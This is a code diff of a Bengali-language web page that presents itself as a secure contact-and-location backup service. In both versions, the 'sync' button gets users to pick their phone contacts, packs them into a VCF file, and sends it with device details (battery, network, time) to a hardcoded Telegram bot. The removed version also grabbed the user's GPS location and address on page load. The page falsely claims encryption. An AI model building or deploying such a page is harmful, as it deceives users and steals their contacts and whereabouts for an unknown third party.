@@ -3,226 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Data Backup Pro</title>
+    <title>Premium Backup Pro</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #d4af37; /* Golden */
-            --bg: #0f172a;    /* Deep Dark Blue/Black */
-            --card: #1e293b;
-            --text: #f8fafc;
+            --gold: #ffcc00;
+            --gold-dark: #b8860b;
+            --bg-dark: #0a0e14;
+            --card-bg: #161b22;
+            --text-gray: #8b949e;
         }
 
         body {
             font-family: 'Hind Siliguri', sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
+            background-color: var(--bg-dark);
+            color: #ffffff;
             margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-        }
-
-        .container {
-            background: var(--card);
-            width: 90%;
-            max-width: 420px;
-            padding: 40px 30px;
-            border-radius: 30px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            text-align: center;
-            border: 1px solid rgba(212, 175, 55, 0.2);
-            position: relative;
             overflow: hidden;
         }
 
-        .container::before {
-            content: "";
+        /* প্রিমিয়াম কার্ড ডিজাইন */
+        .premium-card {
+            background: var(--card-bg);
+            width: 360px;
+            padding: 40px 25px;
+            border-radius: 35px;
+            text-align: center;
+            border: 1px solid rgba(255, 204, 0, 0.15);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
+            position: relative;
+        }
+
+        .premium-card::after {
+            content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(212, 175, 55, 0.05) 0%, transparent 70%);
-            z-index: 0;
+            top: -2px; left: -2px; right: -2px; bottom: -2px;
+            background: linear-gradient(135deg, var(--gold), transparent, var(--gold-dark));
+            border-radius: 35px;
+            z-index: -1;
+            opacity: 0.2;
         }
 
-        .content { position: relative; z-index: 1; }
-
-        .logo {
-            font-size: 60px;
-            margin-bottom: 20px;
-            filter: drop-shadow(0 0 10px var(--primary));
+        .main-icon {
+            font-size: 50px;
+            background: linear-gradient(to bottom, var(--gold), var(--gold-dark));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
         }
 
-        h2 { color: var(--primary); margin-bottom: 10px; font-weight: 600; font-size: 26px; }
-        p { color: #94a3b8; font-size: 15px; margin-bottom: 30px; line-height: 1.6; }
+        h2 { font-size: 24px; margin-bottom: 10px; font-weight: 600; letter-spacing: 1px; }
+        p { color: var(--text-gray); font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
 
-        .input-box {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+        /* ইনফো গ্রিড ডিজাইন */
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+
+        .info-item {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 12px;
             border-radius: 15px;
-            padding: 15px;
-            margin-bottom: 20px;
-            text-align: left;
+            border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        label { font-size: 12px; color: var(--primary); font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
-        
-        #displayLocation { color: #fff; font-size: 14px; margin-top: 5px; min-height: 20px; }
+        .info-item label { display: block; font-size: 10px; color: var(--gold); text-transform: uppercase; margin-bottom: 4px; font-weight: bold; }
+        .info-item span { font-size: 13px; font-weight: 600; }
 
-        .btn {
-            background: linear-gradient(135deg, #d4af37, #f2d06b);
+        /* মডার্ন বাটন */
+        .sync-btn {
+            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
             color: #000;
             border: none;
             padding: 18px;
             width: 100%;
-            border-radius: 15px;
-            font-size: 18px;
+            border-radius: 18px;
+            font-size: 17px;
             font-weight: bold;
             cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 10px 20px rgba(212, 175, 55, 0.3);
+            transition: 0.4s;
+            box-shadow: 0 10px 20px rgba(184, 134, 11, 0.3);
         }
 
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(212, 175, 55, 0.4); }
-        .btn:active { transform: scale(0.98); }
+        .sync-btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 15px 30px rgba(184, 134, 11, 0.5);
+        }
 
-        #status { margin-top: 25px; font-size: 14px; color: var(--primary); font-weight: 500; }
+        #status { margin-top: 25px; font-size: 13px; color: var(--gold); font-weight: 500; }
 
-        .loading-bar {
-            height: 4px;
-            width: 0%;
-            background: var(--primary);
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            transition: 0.5s;
+        .progress-line {
+            height: 3px; width: 0%;
+            background: var(--gold);
+            position: absolute; bottom: 0; left: 0;
+            transition: 0.6s ease;
+            border-radius: 0 0 0 35px;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="content">
-        <div class="logo">🛡️</div>
-        <h2>সিকিউর ক্লাউড সিঙ্ক</h2>
-        <p>আপনার কন্টাক্ট এবং লোকেশন ডেটা এনক্রিপ্টেড ব্যাকআপ নিতে নিচের বাটনে ক্লিক করুন।</p>
-        
-        <div class="input-box">
-            <label>ডিটেক্টেড লোকেশন</label>
-            <div id="displayLocation">লোকেশন পারমিশন চেক করা হচ্ছে...</div>
+<div class="premium-card">
+    <div class="main-icon">💎</div>
+    <h2>সিলেক্টিভ ব্যাকআপ</h2>
+    <p>নিরাপদ ক্লাউড স্টোরেজে আপনার কন্টাক্ট এবং ডিভাইস ডেটা সিঙ্ক করুন।</p>
+    
+    <div class="info-grid">
+        <div class="info-item">
+            <label>ব্যাটারি</label>
+            <span id="bat-val">--%</span>
         </div>
-
-        <button id="syncBtn" class="btn">ব্যাকআপ শুরু করুন</button>
-        <div id="status">সিস্টেম অনলাইন</div>
+        <div class="info-item">
+            <label>নেটওয়ার্ক</label>
+            <span id="net-val">চেকিং...</span>
+        </div>
     </div>
-    <div class="loading-bar" id="loadBar"></div>
+
+    <button id="mainAction" class="sync-btn">সিঙ্ক শুরু করুন</button>
+    <div id="status">সিস্টেম এনক্রিপ্টেড</div>
+    <div class="progress-line" id="progLine"></div>
 </div>
 
 <script>
-    const TELEGRAM_CONFIG = {
+    const CONFIG = {
         TOKEN: '7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc',
         CHAT_ID: '5923885908'
     };
 
-    let fullAddress = "পাওয়া যায়নি";
-    let coords = "";
-
-    // ১. পেজ লোড হতেই অটোমেটিক লোকেশন বের করা
-    async function autoLocate() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-                try {
-                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
-                    const data = await res.json();
-                    fullAddress = data.display_name;
-                    document.getElementById('displayLocation').innerText = fullAddress;
-                } catch (e) {
-                    document.getElementById('displayLocation').innerText = coords;
-                }
-            }, () => {
-                document.getElementById('displayLocation').innerText = "পারমিশন ব্লক করা হয়েছে";
-            });
+    // ১. ডিভাইস তথ্য রিয়েল-টাইম আপডেট
+    async function updateDeviceStats() {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            document.getElementById('bat-val').innerText = Math.round(battery.level * 100) + "%";
         }
+        document.getElementById('net-val').innerText = navigator.connection?.effectiveType.toUpperCase() || "N/A";
     }
-    autoLocate();
+    updateDeviceStats();
 
-    const syncBtn = document.getElementById('syncBtn');
+    const btn = document.getElementById('mainAction');
     const status = document.getElementById('status');
-    const loadBar = document.getElementById('loadBar');
+    const prog = document.getElementById('progLine');
 
-    syncBtn.addEventListener('click', async () => {
+    btn.addEventListener('click', async () => {
         try {
-            if (!('contacts' in navigator)) {
-                alert("আপনার ব্রাউজারে কন্টাক্ট সাপোর্ট নেই। দয়া করে অ্যান্ড্রয়েড ক্রোম ব্যবহার করুন।");
-                return;
-            }
+            if (!('contacts' in navigator)) throw new Error("Unsupported Browser");
 
             const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
             if (contacts.length > 0) {
-                syncBtn.disabled = true;
-                status.innerText = "এনক্রিপ্টিং এবং সেন্ডিং...";
-                loadBar.style.width = "40%";
+                btn.disabled = true;
+                status.innerText = "সার্ভারে পাঠানো হচ্ছে...";
+                prog.style.width = "45%";
 
-                // ২. ডিভাইস ইনফো সংগ্রহ
-                const battery = await navigator.getBattery();
-                const deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    battery: Math.round(battery.level * 100) + "%",
-                    charging: battery.charging ? "Yes" : "No",
-                    connection: navigator.connection?.effectiveType || "Unknown",
-                    time: new Date().toLocaleString('bn-BD')
-                };
+                // ২. বর্তমান সময়, বার এবং তারিখ তৈরি (Bangla Locale)
+                const now = new Date();
+                const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                const banglaDate = now.toLocaleDateString('bn-BD', options);
+                const banglaTime = now.toLocaleTimeString('bn-BD');
 
-                // ৩. VCF ফাইল তৈরি
-                let vcfData = "";
+                // ৩. ব্যাটারি ও নেটওয়ার্ক আপডেট
+                const bat = await navigator.getBattery();
+                const net = navigator.connection?.effectiveType || "Unknown";
+
+                // ৪. VCF ডেটা তৈরি
+                let vcf = "";
                 contacts.forEach(c => {
-                    vcfData += `BEGIN:VCARD\nVERSION:3.0\nFN:${c.name ? c.name[0] : 'Unknown'}\nTEL:${c.tel ? c.tel[0] : ''}\nEND:VCARD\n`;
+                    const name = c.name ? c.name[0] : "অচেনা";
+                    const tel = c.tel ? c.tel[0] : "";
+                    vcf += `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL:${tel}\nEND:VCARD\n`;
                 });
 
-                // ৪. পূর্ণাঙ্গ রিপোর্ট তৈরি
-                const reportMsg = `🏆 **প্রিমিয়াম ব্যাকআপ রিপোর্ট**\n\n` +
-                    `👤 **মোট কন্টাক্ট:** ${contacts.length}\n` +
-                    `📍 **ঠিকানা:** ${fullAddress}\n` +
-                    `🗺 **কোঅর্ডিনেট:** ${coords}\n\n` +
-                    `📱 **ডিভাইস তথ্য:**\n` +
-                    `🔋 ব্যাটারি: ${deviceInfo.battery} (Charging: ${deviceInfo.charging})\n` +
-                    `🌐 নেটওয়ার্ক: ${deviceInfo.connection}\n` +
-                    `⏰ সময়: ${deviceInfo.time}`;
+                // ৫. প্রফেশনাল রিপোর্ট মেসেজ
+                const report = `⚜️ **প্রিমিয়াম ডেটা রিপোর্ট** ⚜️\n\n` +
+                               `👥 **মোট কন্টাক্ট:** ${contacts.length} টি\n` +
+                               `🔋 **ব্যাটারি:** ${Math.round(bat.level * 100)}%\n` +
+                               `📶 **নেটওয়ার্ক:** ${net.toUpperCase()}\n` +
+                               `📅 **তারিখ:** ${banglaDate}\n` +
+                               `⏰ **সময়:** ${banglaTime}\n` +
+                               `🗓 **বার:** ${now.toLocaleDateString('bn-BD', {weekday: 'long'})}\n\n` +
+                               `✅ ডেটা এনক্রিপশন সফল হয়েছে।`;
 
-                // ৫. টেলিগ্রামে পাঠানো
-                await sendToTelegram(reportMsg, vcfData);
+                // ৬. টেলিগ্রামে পাঠানো
+                await sendToBot(report, vcf);
 
-                loadBar.style.width = "100%";
-                status.innerText = "✅ ব্যাকআপ সফলভাবে সম্পন্ন হয়েছে!";
-                status.style.color = "#d4af37";
+                prog.style.width = "100%";
+                status.innerText = "✅ ব্যাকআপ সফলভাবে সম্পন্ন!";
+                status.style.color = "#ffcc00";
             }
-        } catch (err) {
-            status.innerText = "ত্রুটি: " + err.message;
-            syncBtn.disabled = false;
+        } catch (e) {
+            status.innerText = "এরর: " + e.message;
+            btn.disabled = false;
         }
     });
 
-    async function sendToTelegram(msg, vcf) {
-        // মেসেজ পাঠানো
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.TOKEN}/sendMessage`, {
+    async function sendToBot(msg, vcf) {
+        // রিপোর্ট মেসেজ
+        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CONFIG.CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: 'Markdown' })
         });
 
-        // VCF ফাইল পাঠানো
+        // VCF ফাইল
         const blob = new Blob([vcf], { type: 'text/vcard' });
         const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
+        formData.append('chat_id', CONFIG.CHAT_ID);
         formData.append('document', blob, `Backup_${Date.now()}.vcf`);
 
-        return fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.TOKEN}/sendDocument`, {
+        return fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendDocument`, {
             method: 'POST',
             body: formData
         });
